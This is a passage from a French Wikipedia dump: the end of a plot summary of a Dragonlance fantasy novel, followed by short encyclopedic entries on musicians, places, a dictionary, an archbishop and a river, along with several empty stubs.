Gilthanas et Silvara arrivent à Palanthas, ramenant avec eux les légendaires dragons du bien. Ils expliquent qu'ils ont été à Sanction, le siège de l'armée des dragons et qu'ils ont découvert la vérité à propos de l'origine des draconiens. L'armée des dragons s'était assuré que les dragons du bien ne feraient pas la guerre contre eux en prenant en otage leurs œufs. Mais Gilthanas et Silvara ont découvert que les prêtres de Takhisis et les mages des robes noires ont perverti les œufs dans le but de faire éclore la nouvelle race de draconiens. Après avoir expliqué aux dragons du bien ce qu'il arrivait à leurs œufs, ces derniers sont maintenant disposés à rejoindre le combat pour venger leurs enfants.
Plus tard, Gilthanas dit à Laurana que bien qu'il ait été à Sanction, il a surpris une conversation du haut seigneur de dragon, Kitiara, se vantant auprès de l'empereur du dragon, Ariakas, à propos du fait que Tanis demi-elf la servait comme officier et amant. Cela confirme pour Laurana ce que Kitiara lui a dit à la tour du haut prêtre dans le précédent roman.
En possession des Lancedragons, et les dragons du bien à ses côtés, Laurana coordonne une cavalerie aérienne avec les Chevaliers de Solamnie. Son armée part à l'offensive. Durant cette campagne, Laurana est reconnue comme le "Général doré" parce que sa beauté et son courage inspire ses troupes. Son armée déferle à l'extérieur de Palanthas, battant les armées du dragon dans une série de combats, et libère également une partie du nord de la Solamnie. Durant l'une de ces batailles, Tasslehoff et Flint montent un dragon de bronze - connu sous le nom de Fireflash - et capturent le second en commandement de Kitiara, Bakaris (ce dernier a insisté pour rejoindre le combat, en dépit du fait qu'il ne puisse pas utiliser son bras qui a été précédemment blessé par Laurana dans la tour du haut prêtre).
Livre 2.
Le piège.
L'armée de Laurana libère la cité de Kalaman, et ses habitants honorent le général doré pendant leur festival d'une aube de printemps. Kitiara réagi en envoyant un message à la princesse elfe lui disant que Tanis a été mortellement blessé et qu'il veut la voir avant de mourir. Elle permettra l'échange de Tanis uniquement contre Bakaris. Flint et Tas préviennent Laurana que Kitiara lui ment et qu'évidemment c'est un piège, mais Laurana veut croire que le message est vrai, et insiste pour aller faire l'échange. Laurana, Flint et Tas amène Bakaris sur le lieu de la rencontre où ils sont trahis, puis ils sont forcés à se rendre au château de Dargaard. Alors qu'ils sont presque arrivés au château, Bakaris essaye de violer Laurana. Tasslehoff vient à sa défense, et poignarde Bakaris. Ce qui permet à Laurana de le tuer. Mais c'est à ce moment précis que le chevalier de la mort, Lord Soth, l'un des alliés les plus puissants de Kitiara, décide d'apparaître. Lord Soth maîtrise Laurana, et la porte inconsciente jusqu'au château de Dargaard. Il permet à Flint et Tas de retourner à Kalaman pour dire à la ville que le Général Doré est maintenant la prisonnière de Kitiara.
Réunification.
En poursuivant leur voyage dans le tourbillon, Tanis et ses Compagnons, ainsi que Berem l'Everman (qui révèle qu'il faisait semblant d'être muet), se retrouvent dans l'ancienne cité d'Istar qui est située sous l'eau. Ils sont sauvés de la mort par des elfes des mers, dont la ville est maintenant habitée. Les compagnons font la rencontre d'Apoletta, une elfe des mers, ainsi que de son mari Zebulah, un mage humain de l'ordre des robes rouges. Dans un premier temps Apoletta est contre le fait d'aider les Compagnons, ou de les laisser retourner à la surface, mais lorsque Tanis lui parle de l'armée des dragons et lui démontre son ignorance concernant l'existence des dragons du bien, elle réalise à quel point la situation est désastreuses et cède.
Les compagnons sont rejetés juste devant Kalaman avec seulement de vague souvenir de la cité sous la mer. Plus tard, Kitiara revient à Kalaman et révèle que Laurana a été emportée au temple de Takhisis à Neraka. Elle demande une reddition sans condition ainsi que la livraison de Berem l'Everman dans les trois semaines sans quoi Laurana sera tuée. Tanis décide d'aller à Neraka avec Berem, pour essayer de secourir Laurana, accompagné de Caramon, Tika, Flint et Tasslehoff.
Livre 3.
Mission sauvetage.
En partant pour Neraka, les compagnons tombent sur Fizban et Pyrite, le dragon doré (qui se « transforme » en statue pour pouvoir être transporté pendant le voyage). Pendant le voyage, Flint meurt à la suite d'un problème au cœur. Fizban s'éclipse à ce moment-là. Puis, Berem se décide à raconter son histoire aux compagnons.
Il explique qu'un jour bien après le cataclysme, il découvrit avec sa sœur, nommé Jasla, une colonne de joyaux à moitié enterrée dans le sol. C'était en fait la pierre de fondation du temple du prêtre roi, qui avait atterri ici après avoir traversé différent plan d'existence. Berem était submergé par son avidité, et il essaya d'extirper l'un des émeraudes oublié contre l'avis de sa sœur qui sentait l'aura sacrée de l'endroit. Ils luttèrent, et Jasla meurt après s'être cognée contre la colonne. La reine des ténèbres se manifesta alors, et incrusta l'émeraude dans la poitrine de Berem comme récompense pour l'avoir libérée, lui révélant que cette colonne sert de porte avec les Abysses. Cependant, l'esprit pure de Jasla encore présent dans la colonne permit d'empêcher la Majesté Noire de passer. Jasla demanda alors à Berem de s'enfuir pendant qu'un nouveau temple de Takhisis se construisit autour du site.
Neraka.
Les compagnons atteignent Neraka et le temple de Takhisis, en dessous de l'endroit où se trouvent les vestiges de la colonne. Lorsque les gardes deviennent suspicieux, Tanis sait qu'il serait dangereux qu’il soit découvert tous ensemble, et qu'ils ont besoin de se séparer. Il prend rapidement la décision d’interpeller Kitiara qui n'est pas très loin d’eux en train de parader, sur le dos de son dragon, à l’occasion de la cérémonie d'entrée dans la ville. Puis, il la rejoint en espérant pouvoir sauver Laurana pendant que les autres pourront plus facilement s'occuper de la colonne. Tanis indique à Kitiara qu'il est venue s'offrir à elle en échange de Laurana, et qu'il est prêt à servir sous ses ordres en tant qu'officier de l'armée du dragon. Kitiara semble accepter mais à en fait d'autres intentions concernant l'elfe. Elle compte laisser Laurana se faire torturer par Takhisis, puis la donner à Lord Soth pour qu'elle devienne l'une de ses conjointes mortes-vivantes. En le forçant à être témoin de cela, Kitiara espère briser Tanis une fois pour toutes afin de pouvoir en faire ce qu’elle veut.
Pendant ce temps, Gakhan découvre la véritable identité de ceux qui viennent juste d'arriver avec Tanis. Il trouve les héros sous le Temple. Lorsqu'il essaie d'attraper l'Everman, ce dernier bien que sans arme le tue, et une alarme retentit. Berem entend sa sœur Jasla l'appeler et lui demander de trouver la colonne de joyaux. Caramon suit l'Everman pendant que Tika et Tas s'enfuient dans une autre direction pour détourner la poursuite sur eux.
Pendant ce temps, plus haut, le grand conseil des hauts seigneurs du dragon a commencé. Tanis marche vers l'imposante salle à la tête des troupes de Kitiara. L'empereur Ariakas préside la séance du conseil car il possède la couronne de pouvoir, et comme l'explique Kitiara "celui qui détient la couronne décide." Les forces d'Ariakas et de Kitiara en sont presque à détruire le protocole jusqu'à ce que Takhisis arrive et impose l'ordre.
Vient ensuite Lord Soth qui tient un corps qui été enveloppé de la tête au pied dans un linceul, et il le place au pied de Kitiara. Elle ouvre l'emballage pour révéler une Laurana en train de suffoquer.
L'elfe captive se met debout en titubant, puis Kitiara lui montre Tanis. Pour lui masquer ses intentions contre Takhisis, Tanis traite Laurana froidement, ce qui a pour effet de la démoraliser. Kitiara présente ensuite Laurana comme cadeau à Takhisis, et lui offre également Tanis pour servir dans l'armée du dragon. Takhisis est ravie par les présents de Kitiara. Elle est d'accord pour torturer Laurana, puis de donner son âme à Lord Soth. Elle accepte également Tanis comme officier, mais elle tient à ce qu'il pose ses armes aux pieds de l'empereur Ariakas pour symboliser son allégeance. Tanis marche lentement vers le plus élevé des hauts seigneurs du dragon qui est un guerrier et un magicien expérimenté. Mais plutôt que de poser son épée aux pieds d'Ariakas, Tanis inverse son mouvement et tue le haut seigneur. Un mage des robes noires se tient à côté de Takhisis, c’est lui qui supprime le bouclier de protection d'Ariakas, permettant à l'attaque de Tanis de le tuer.
Chaos et Fuite.
Tanis prend la couronne de pouvoir et essaye de l'échanger contre Laurana. Laurana profite de cette distraction pour se libérer et attaquer Kitiara. Elle la désarme et la met à terre. Tanis essaye d'arrêter Laurana dans sa fuite, mais Laurana ne croit plus en lui depuis qu’elle l’a vu avec Kitiara. Elle lui dit qu'elle doit suivre son propre chemin - qu'on ne la marchande pas, et qu’on ne la gagne pas, comme un objet. Dans l'indifférence totale, Tanis fait tomber la couronne, et toutes les unités de l'armée du dragon se battent pour la récupérer. Espérant ainsi avoir les faveurs de Takhisis. Dans la confusion, l'indépendante Laurana se fraie un chemin en dehors de la salle. Tanis la poursuit. La déesse Takhisis disparaît soudain, préoccupé par autre chose plus important que le combat pour la couronne.
Plus profondément dans le temple, Caramon et Berem atteignent la salle de la colonne de joyaux, mais ils sont bloqués par l'apparition soudaine de Raistlin. Le frère de Caramon porte une robe noire. C’est en fait le magicien qui a désarmé plus tôt la défense d'Ariakas pour aider Tanis. Il explique qu'il s'est allié lui-même à Takhisis pour avoir plus de puissance (et probablement pour obtenir la clé de la Connaissance). Après y avoir réfléchi à deux fois, il décide de la trahir, et permet à Berem d'aller à la colonne de joyaux. L'Everman se jette sur la colonne et se tue. Son esprit est réuni avec celui de sa sœur, ce qui permet de fermer la porte à la reine du mal avec le monde réel. Ce qui a pour conséquence pour Raistlin de mettre hors de cause 2 grands rivaux, Ariakas et Takhisis. Il est maintenant la seule force du mal la plus puissante de Krynn. La reine du mal est bannie une fois de plus, et son temple commence à s'écrouler.
Pensant qu'il a encore une petite dette envers son frère (ainsi qu'à Tika et Tasslehoff), Raistlin les aide dans leur fuite de Neraka. Raistlin appelle ensuite Cyan Bloodbane, et juste avant qu’il s’en aille, Caramon (qui sait que son jumeau suit maintenant la voie du mal) lui demande pour l'accompagner. Raistlin refuse et lui dit qu'ils sont maintenant comme les dieux le voulaient, 2 personnes uniques et séparées.
Tanis rattrape finalement Laurana mais avant qu'il ne puisse dire quoi que ce soit Kitiara arrive aussi. Elle offre à Tanis une dernière chance de le rejoindre comme chef de l'armée du dragon, et le prévient que Lord Soth arrive pour récupérer Laurana. Tanis refuse, et indique à Kitiara que non seulement il mourrait pour Laurana, mais aussi qu'il utiliserait son dernier souffle pour demander à Paladine de protéger l'âme de l'elfe de Lord Soth. Et que malgré ses transgressions, il sait que Paladine lui est redevable, et qu'il serait d'accord. Laurana réalise alors que Tanis n'est pas devenu mauvais, et qu'il l'aime. Kitiara étonnamment indique aux couples la sortie que les autres compagnons ont utilisée. Tanis et Laurana s'enfuit juste avant que Lord Soth n'entre dans la salle. Le Chevalier de la mort présente la couronne de pouvoir à Kitiara. Kitiara révèle à Lord Soth que sa vengeance est parfaite à l'encontre de Tanis et Laurana. En jouant la pitié, elle pense qu’elle a réussi à s’immiscer pour toujours dans les pensées de Tanis, et ainsi empoisonner leur relation à long terme.
Fin et épilogue.
En sortant de la ville, Tanis et Laurana rencontre Fizban, Caramon, Tika et Tasslehoff. Fizban révèle qu'il est bien le dieu Paladine. Tanis le reconnaît également maintenant comme étant le vieil homme qui se trouvait à l'Auberge, et qui les a en premier incités à rentrer dans l'action en appelant les gardes dans un "Dragons d'un crépuscule d’automne". Fizban dit aux héros que les bons dragons et les mauvais dragons resteront sur l'Ansalon pour ainsi restaurer l'équilibre entre le bien et le mal.
Fizban explique à Caramon que l'esprit qui a aidé Raistlin par moments (et avec qui Raistlin a fait un marché dans la Grand Bibliothèque) est un ancien mage du mal, Fistandantilus. Mais il lui fait remarquer que Raistlin n'est pas posséder et qu'il fait ses propres choix et ses propres actions.
Les compagnons se séparent. Tasslehoff voyage jusqu'à Kenderhome, Caramon et Tika rentrent à Solace, et Tanis et Laurana s'en vont à Kalaman.
Dans l'épilogue, Raistlin se rend à la tour de haute sorcellerie, qui se trouve dans un coin abandonné de la ville de Palanthas, enchantée et inoccupée depuis la fin du Cataclysme. Il se proclame comme étant le maître du passé et du présent dont la venue était annoncée. Il est reconnu par les habitants spectraux de la tour, et s'installe dans sa nouvelle maison.
Thèmes.
Ce dernier livre (dans la trilogie) s'occupe de la majorité des personnages en affirmant entièrement leur propre identité qui a évolué depuis le premier livre. Raistlin est finalement un homme solide et indépendant qui n'a pas besoin de s'appuyer sur l'aide de son frère. Tasslehoff apprends à avoir peur pour les autres à travers la douleur et devient différent des autres kender. Tanis réalise que son amour pour Laurana est l'équilibre de sa nature double. Laurana change complétement son point de vue sur le monde, et sur ce que l'amour veut dire. Caramon semble être le seul compagnon dont les émotions sont bloquées, réticent à laisser partir son frère ainsi qu'à accepter les compétences pour le mal de celui-ci.
Liens avec les autres livres.
La trilogie des Légendes de LanceDragon est la suite de la trilogie des Chroniques. Elle détaille les projets de Raistlin pour obtenir encore plus de puissance. Fizban raconte lui-même une partie de l'intrigue de cette histoire lorsqu'il parle à Tasslehoff à propos de Flint. La trilogie des Légendes raconte dans le moindre détail la relation entre Raistlin et Fistandantilus, et révèle également le destin de Kitiara.

</doc>
<doc id="9411375" url="https://fr.wikipedia.org/wiki?curid=9411375" title="Geely CK">
Geely CK



</doc>
<doc id="9411378" url="https://fr.wikipedia.org/wiki?curid=9411378" title="Marijn Simons">
Marijn Simons

Marijn Simons (né le à Geleen) est un compositeur, chef d'orchestre et violoniste néerlandais.
Biographie.
Marijn Simons reçoit à quatre ans ses premières leçons de violon, puis, à huit ans, ayant déménagé avec sa famille à Amsterdam, il commence à travailler avec Davina van Wely au Conservatoire d'Amsterdam. À dix ans, il fait ses débuts avec le Concerto pour violon de Mendelssohn. Il termine ses études de violon en travaillant avec Saschko Gawriloff jusqu'en 1997. Parallèlement, il reçoit, entre 1996 et 2002, des leçons de composition avec Daan Manneke au Conservatoire d'Amsterdam, ainsi qu'avec le compositeur écossais James MacMillan. Il a également pris des cours privés de direction d'orchestre avec Jean-Bernard Pommier et Ed Spanjaard.
Il est dorénavant premier violon de l'Orchestre symphonique d'Aix-la-Chapelle. En , il dirige le premier concert de l'ensemble qu'il a fondé, le "Simons Ensemble".
Simons a été compositeur en résidence en 2004 au Festival de musique de chambre de Delft et en 2005 au Festival de Cabrillo à Santa Cruz.

</doc>
<doc id="9411383" url="https://fr.wikipedia.org/wiki?curid=9411383" title="Escadron de chasse 3/20 Oranie">
Escadron de chasse 3/20 Oranie

L'escadron de chasse 3/20 Oranie est une ancienne unité de chasse de l'armée de l'air française ayant connu une existence relativement brève, entre le et le .
Pendant toute son existence, l'escadron a été basé en Algérie. Il a participé aux opérations de la Guerre d'Algérie.
Historique.
L'escadron a été créé à Boufarik le au sein de la 20e escadre de chasse. Il reprend les traditions du défunt 1/6 Oranie de la 6e escadre de chasse.

</doc>
<doc id="9411386" url="https://fr.wikipedia.org/wiki?curid=9411386" title="Dictionnaire occitan-français selon les parlers languedociens">
Dictionnaire occitan-français selon les parlers languedociens

Le Dictionnaire occitan-français selon les parlers languedociens est un dictionnaire bilingue occitan-français basé sur le languedocien, écrit en graphie classique et publié pour la première fois en 1966 par l'Institut d'études occitanes. Il est basé sur des manuscrits de Louis Alibert publiés à titre posthume et est le complément lexicographique de la grammaire occitane du même auteur, publiée en 1935. Il s'agit du premier dictionnaire de référence de la norme classique occitane.
Genèse.
Durant l’après-guerre, Alibert a travaillé discrètement à son projet de "Dictionnaire occitan-français d'après les parlers languedociens". Il est mort en 1959 sans l'avoir achevé.
Le dictionnaire se trouvait donc sous forme de fiches manuscrites. L'IEO, qui avait adopté la norme classique fixée par Alibert, a manifesté son désir d'éditer ce dictionnaire mais a dû négocier avec la belle-sœur d’Alibert, qui avait le contrôle du manuscrit et qui supervisait son édition. Cette belle-sœur n'avait pas les compétences linguistiques et est responsable d'un grand nombre d'erreurs d'interprétation du manuscrit. C'est dans ces conditions défavorables que l’IEO a édité le dictionnaire d’Alibert, à titre posthume, en 1966.
Le dictionnaire d'Alibert est fondamentalement basé sur le "Lou Tresor dóu Felibrige" de Frédéric Mistral, dictionnaire traitant de l'ensemble des parlers occitans (prenant le dialecte provençal pour base) écrit en norme mistralienne. Le dictionnaire d'Alibert en est une réduction limitée au languedocien, complétée notamment de données collectées par Alibert lors d'enquêtes linguistiques qu'il avait menées.
Le dictionnaire d’Alibert a des qualités et des défauts. Le «"Diccionari ortografic, gramatical e morfologic de l'occitan"» de Josiane Ubaud (2011) donne la liste de ses fautes et coquilles (800 environ) qui ont été reprises dans certains dictionnaires plus récents.
Bibliographie.
Études critiques sur le dictionnaire d'Alibert : 

</doc>
<doc id="9411388" url="https://fr.wikipedia.org/wiki?curid=9411388" title="Levent Aycicek">
Levent Aycicek



</doc>
<doc id="9411394" url="https://fr.wikipedia.org/wiki?curid=9411394" title="Okan Aydin">
Okan Aydin



</doc>
<doc id="9411422" url="https://fr.wikipedia.org/wiki?curid=9411422" title="Drosophila adiastola">
Drosophila adiastola

Drosophila adiastola est une espèce d'insectes diptères de la famille des Drosophilidae.
Systématique.
L'espèce "Drosophila adiastola" a été décrite en 1965 par le diptérologue américain (1914-2002) dans une publication coécrite avec Elwood Curtin Zimmerman (1912-2004).

</doc>
<doc id="9411423" url="https://fr.wikipedia.org/wiki?curid=9411423" title="Jackie Brenston &amp; His Delta Cats">
Jackie Brenston &amp; His Delta Cats



</doc>
<doc id="9411424" url="https://fr.wikipedia.org/wiki?curid=9411424" title="Dance for Burgess">
Dance for Burgess

Dance for Burgess est une courte pièce pour orchestre de chambre d'Edgard Varèse composée en 1949. Elle fut créée le à New York, mais ne fut éditée qu'en 1998 par Ricordi, grâce à Chou Wen-chung, l'exécuteur testamentaire de Varèse.
Histoire de la composition et de la création.
"Dance for Burgess" est dédié au danseur Burgess Meredith.
Nomenclature.
Cette pièce est composée pour un orchestre de chambre comprenant, outre les cordes, 1 flûte piccolo, 1 clarinette en mi bémol, 1 clarinette en si bémol, 1 saxophone ténor, 1 cor, 2 trompettes, 1 trombone, 1 tuba, 3 percussionnistes et 1 piano.
Structure.
"Dance for Burgess" est une pièce courte, durant moins de deux minutes.

</doc>
<doc id="9411426" url="https://fr.wikipedia.org/wiki?curid=9411426" title="Boxe aux Jeux africains de 2015">
Boxe aux Jeux africains de 2015

Les compétitions de boxe anglaise de la des Jeux africains se sont déroulées du 2 au à Brazzaville, République du Congo.

</doc>
<doc id="9411429" url="https://fr.wikipedia.org/wiki?curid=9411429" title="Élections législatives norvégiennes de 1977">
Élections législatives norvégiennes de 1977

Les élections législatives norvégiennes de 1977 ("Stortingsvalet 1977", en norvégien) se sont tenues le , afin d'élire les cent cinquante-cinq députés du Storting pour un mandat de quatre ans.
Résultats.
Le Parti travailliste obtient la majorité absolue au Storting. C'est la dernière fois qu'un parti obtient la majorité absolue, depuis tous les gouvernements sont des gouvernements de coalition.

</doc>
<doc id="9411437" url="https://fr.wikipedia.org/wiki?curid=9411437" title="Zhang Kai-Lin">
Zhang Kai-Lin

Zhang Kai-Lin, née le , est une joueuse de tennis chinoise, inactive depuis 2019.
Vainqueure de vingt tournois ITF (5 en simple, 15 en double), elle remporte en 2015 son premier titre en catégorie WTA 125 en double à Dalian aux côtés de sa compatriote Zheng Saisai.
Parcours en « Premier Mandatory » et « Premier 5 ».
Découlant d'une réforme du circuit WTA inaugurée en 2009, les tournois WTA « Premier Mandatory » et « Premier 5 » constituent les catégories d'épreuves les plus prestigieuses, après les quatre levées du Grand Chelem.

</doc>
<doc id="9411439" url="https://fr.wikipedia.org/wiki?curid=9411439" title="Double hélice de l'ADN">
Double hélice de l'ADN



</doc>
<doc id="9411441" url="https://fr.wikipedia.org/wiki?curid=9411441" title="Arthur Farwell">
Arthur Farwell

, né le , à Saint Paul, dans le Minnesota, et mort le , à New York, est un compositeur, pédagogue, lithographe, éditeur de musique et chef d'orchestre américain. Il était féru d’occultisme.
Biographie.
Il a fait des études d'ingénieur au Massachusetts Institute of Technology dont il est diplômé en 1883. Mais il se tourne vers les études musicales à Boston. Il part en Europe, où il est l'élève du compositeur Engelbert Humperdinck à Berlin, puis d'Alexandre Guilmant à Paris. 
Revenu aux États-Unis il étudie la musique à la Cornell University de 1899 à 1901, et fonde, en 1901, à Newton Center, dans le Massachusetts, la Wa-Wan Press, consacrée à la publication des œuvres des compositeurs de la mouvance « indianiste »dont il devient une des figures marquantes. C'est dans les musiques populaires, le ragtime, les chants des Afro-Américains, les chansons de cow-boys et surtout les rythmes et chants indiens que les musiciens « indianistes » veulent puiser pour créer une musique qui soit vraiment américaine.
De 1910 à 1913 Farwell dirige des concerts municipaux à New York, et, de 1915 à 1918, il dirige la Music School Settlement. En 1918 il part en Californie, où il prend la tête du département de la musique de l'University of California, Berkeley et fonde le Chœur de la communauté de Santa Barbara.
Avec sa presse lithographique il reproduit et illustre lui-même ses partitions.
Bernard Rogers a été un de ses élèves les plus remarquables.

</doc>
<doc id="9411442" url="https://fr.wikipedia.org/wiki?curid=9411442" title="Rivière Coulombe">
Rivière Coulombe

La rivière Coulombe est un tributaire du lac Aylmer lequel est traversé par la rivière Saint-François qui constitue un affluent de la rive sud du fleuve Saint-Laurent.
Le cours de la rivière Coulombe coule sur la rive sud du fleuve Saint-Laurent, au Québec, Canada. Elle traverse le territoire des municipalités de :
Géographie.
Les principaux bassins versants voisins de rivière Coulombe sont :
La rivière Coulombe prend sa source dans une zone de marais à à l'ouest du Mont Louise, à au sud du centre du village Saints-Martyrs-Canadiens, à à l'est d'une carrière abandonnée et à au sud du lac Sunday.
À partir de cette zone de marais, le cours de la rivière Coulombe coule sur réparti selon les segments suivants :
La rivière Coulombe se déverse sur la rive ouest de la Baie Ward du lac Aylmer. L'embouchure est situé à (en ligne directe) au sud-ouest de l'intersection de la route 161 et de la route 112 du village de Beaulac-Garthby.
La villégiature est particulièrement développée autour de la baie Ward.
Toponymie.
Le toponyme Rivière Coulombe a été officiellement inscrit le à la Commission de toponymie du Québec.

</doc>
<doc id="9411445" url="https://fr.wikipedia.org/wiki?curid=9411445" title="Comité républicain du commerce, de l'industrie et de l'agriculture">
Comité républicain du commerce, de l'industrie et de l'agriculture

Le Comité républicain du commerce, de l'industrie et de l'agriculture, appelé « comité Mascuraud » du nom de Alfred Mascuraud, est un comité politico-économique créé en 1899 afin de servir de relais entre le patronat parisien et provincial et les hommes politiques de centre-gauche. Il appuie le gouvernement de défense républicaine de Pierre Waldeck-Rousseau puis le Parti républicain, radical et radical-socialiste, du moins jusqu'en 1918, avant de se rapprocher un temps du centre-droit après la Première Guerre mondiale.
Il a été présidé successivement par Alfred Mascuraud, joaillier parisien élu sénateur en 1905, le sénateur Charles Chaumet, hostile à l'alliance entre les radicaux et les socialistes lors de la formation du cartel des gauches en 1924, le député radical-socialiste Louis Proust, à partir de 1931, et enfin le député puis sénateur alsacien, Paul Jourdain, filateur, à partir de juin 1934. Jourdain, qui n'est pas un radical, a succédé à Proust, éclaboussé par l'affaire Stavisky et démissionnaire en mars 1934.

</doc>
<doc id="9411446" url="https://fr.wikipedia.org/wiki?curid=9411446" title="Alimentation électrique par cable ethernet">
Alimentation électrique par cable ethernet



</doc>
<doc id="9411451" url="https://fr.wikipedia.org/wiki?curid=9411451" title="Adolphe XIII de Schaumbourg">
Adolphe XIII de Schaumbourg

Adolphe XIII de Schaumbourg (aussi nommé "de Schauenburg", , aussi "von Schauenburg") (1511–1556) est comte de Holstein-Schaumbourg de 1531 à 1544 et archevêque-électeur de Cologne de 1547 à 1556.
Biographie.
Adolphe de Holstein-Schaumbourg, fils de Jobst comte de Holstein-Pinneberg et de Schaumbourg et de son épouse Marie de Nassau-Dillenburg, nait le et est baptisé le 3 février suivant.
Bien qu'aîné de sa fratrie il est destiné à l'Eglise depuis son plus jeune âge. À partir de 1522 il étudie à Louvain. Il devient chanoine de la Cathédrale Notre-Dame-et-Saint-Lambert de Liège le puis prévôt de cette même cathédrale le . En 1529, il est également nommé chanoine de la Cathédrale de Mayence et le , de celle de Cologne. Il devient diacre
de la Basilique Saint-Gereon, et prévôt en 1533. À la mort de son père en 1531, Adolphe retourne dans le Schaumbourg afin d'assurer la régence de ses frères cadets. Il reçoit en 1533 Pinneberg et participe ainsi conjointement au gouvernement sous le nom de « Adolphe XIII » avec son frère Otto IV de Schaumbourg jusqu'en 1544.
Au début de la décennie 1530, l'archevêque de Cologne, Hermann V de Wied, commence à afficher ses sympathies pour la Réforme protestante. Afin de contrecarrer l'influence de l' archevêque, le , le chapitre de chanoines de la cathédrale de Cologne élit Adolphe comme coadjuteur de Electeur de Cologne afin qu'il établisse un contre pouvoir aux tentatives de réformes d'Hermann de Wied.
Le , le pape Paul III écrit à Adolphe afin de l'encourager à être vigilant dans sa lutte contre l'archevêque. Le pape excommunie finalement Hermann le , et nomme Adolphe comme administrateur de l'archidiocèse. Celui-ci est alors ordonné prêtre par l'évêque Johann Nopel, le . Le chapitre de chanoines de la cathédrale l'élit ensuite comme Archevêque de Cologne, le . Le premier soin d'Adolphe est de revenir sur les initiatives réformatrices de son prédécesseur : Hermann avait fait appel à Martin Bucer mais Adolphe bannit le prêcheur protestant de l'archidiocèse.
Aidé par Eberhard Billick, supérieur provincial des Grands carmes, Adolphe est présent lors de la Diète d'Empire à Augsbourg en 1547/1548. Il est consacré évêque le , en présence du pape Paul III et de l'empereur Charles Quint. Il participe à la cession de 1551 du Concile de Trente, accompagné par Billick et de Johann Gropper.
Adolphe meurt à Brühl en Westphalie le . Cornelis Floris de Vriendt édifie un tombeau pour Adolphe et son jeune frère Antoine de Holstein-Schaumbourg (mort en 1558). Situé originellement dans le chœur de la cathédrale de Cologne, le monument sera transféré dans une chapelle absidiale en 1863.

</doc>
<doc id="9411452" url="https://fr.wikipedia.org/wiki?curid=9411452" title="Langues déné-ienisseïennes">
Langues déné-ienisseïennes



</doc>
<doc id="9411453" url="https://fr.wikipedia.org/wiki?curid=9411453" title="Hurrah Zara !">
Hurrah Zara !

Hurrah Zara ! est un roman de Jean Raspail paru en aux éditions Albin Michel.
Résumé.
"Hurra Zara" ! décrit les aventures de la famille von Pikendorff, aventures au cours desquelles les femmes jouent un rôle prépondérant. C'est en particulier le cas de Zara. La dynastie se déploie en France avec les de Pikendorff, en Grande-Bretagne avec les Pikendoe ainsi qu'aux États-Unis. Chaque membre de la lignée s'attache à rester fidèle à sa devise : « Je suis d'abord mes propres pas ».
Récompense.
En 1999, le livre a reçu le Grand prix littéraire de la Ville d’Antibes Jacques-Audiberti.

</doc>
<doc id="9411457" url="https://fr.wikipedia.org/wiki?curid=9411457" title="Dragon's Breath Blue">
Dragon's Breath Blue

Le Dragon's Breath Blue est un fromage régional de Nouvelle-Écosse au Canada. C'est un fromage à pâte persillée vendu dans de la cire noire. Sa texture va de molle et crémeuse à une texture dure proche de celle du beurre.

</doc>
<doc id="9411463" url="https://fr.wikipedia.org/wiki?curid=9411463" title="Fibroscopie œso-gastro-duodénale">
Fibroscopie œso-gastro-duodénale



</doc>
<doc id="9411464" url="https://fr.wikipedia.org/wiki?curid=9411464" title="Henry Soumagne">
Henry Soumagne

Henry Soumagne (de son vrai nom Henri Wagener, né à Liège en 1891 et mort à Metz en 1951) est un dramaturge belge particulièrement actif en France durant l'entre-deux-guerres. Son théâtre est influencé par l'expressionnisme et les questions existentielles. Il connait la célébrité à la suite de l'écriture d'une de ses œuvres majeures, "L'Autre Messie" en 1923, qui sera mise en scène au Théâtre de l'Œuvre par Lugné-Poe.
Éléments biographiques.
En 1929, il épouse Georgette Ciselet.

</doc>
<doc id="9411465" url="https://fr.wikipedia.org/wiki?curid=9411465" title="Fibroscopie œsogastroduodénale">
Fibroscopie œsogastroduodénale



</doc>
<doc id="9411466" url="https://fr.wikipedia.org/wiki?curid=9411466" title="Œsogastroduodénoscopie">
Œsogastroduodénoscopie



</doc>
<doc id="9411467" url="https://fr.wikipedia.org/wiki?curid=9411467" title="Fibroscopie œso-gastrique">
Fibroscopie œso-gastrique



</doc>
<doc id="9411468" url="https://fr.wikipedia.org/wiki?curid=9411468" title="Fibroscopie œsogastrique">
Fibroscopie œsogastrique



</doc>
<doc id="9411469" url="https://fr.wikipedia.org/wiki?curid=9411469" title="Anna Vayena">
Anna Vayena



</doc>
<doc id="9411470" url="https://fr.wikipedia.org/wiki?curid=9411470" title="Fibroscopie gastrique">
Fibroscopie gastrique



</doc>
<doc id="9411471" url="https://fr.wikipedia.org/wiki?curid=9411471" title="Fibroscopie gastro-duodénale">
Fibroscopie gastro-duodénale



</doc>
<doc id="9411472" url="https://fr.wikipedia.org/wiki?curid=9411472" title="Fibroscopie gastroduodénale">
Fibroscopie gastroduodénale



</doc>
<doc id="9411473" url="https://fr.wikipedia.org/wiki?curid=9411473" title="Henri Soumagne">
Henri Soumagne



</doc>
<doc id="9411474" url="https://fr.wikipedia.org/wiki?curid=9411474" title="Henri Wagener">
Henri Wagener



</doc>
<doc id="9411475" url="https://fr.wikipedia.org/wiki?curid=9411475" title="Evangelia Vayonaki">
Evangelia Vayonaki



</doc>
<doc id="9411477" url="https://fr.wikipedia.org/wiki?curid=9411477" title="Katashina-gawa">
Katashina-gawa

La est un cours d'eau du Japon dont le cours est entièrement situé dans la préfecture de Gunma. Elle est un affluent du fleuve Tone.
Géographie.
Le bassin de la rivière Katashina, d'une superficie de , est situé dans le nord-est de la préfecture de Gunma. La rivière, longue de , est un affluent du fleuve Tone. Elle prend sa source sur le flanc ouest du mont Kuroiwa sis à cheval sur les trois préfectures de Gunma, Fukushima et Tochigi.
Son cours s'oriente sud-ouest jusqu'au lac artificiel Sonohara dans la partie centrale de la ville de Numata. Quittant le lac Sonohara, il prend la direction du nord-ouest dans Numata puis le long de la limite nord du village de Shōwa. À environ de son point de confluence avec le fleuve Tone, le cours de la rivière s'infléchit sud-ouest.
La rivière Katashina se jette dans le fleuve Tone entre Numata et Shōwa, à la limite ouest du village de Shōwa.
Principaux affluents.
Les principaux affluents de la rivière Katashina sont :
Barrages.
Le barrage Sonohara est le principal barrage construit pour contrôler le courant de la rivière Katashina et, indirectement, celui du fleuve Tone. Il est destiné à la lutte contre les inondations et la production d'énergie hydroélectrique.
Ponts.
En 2015, la rivière Katashina est enjambée par 21 ponts dont le pont en treillis Katashinagawa à Shōwa et le pont à poutres Fukiwari à Numata.
Catastrophes naturelles.
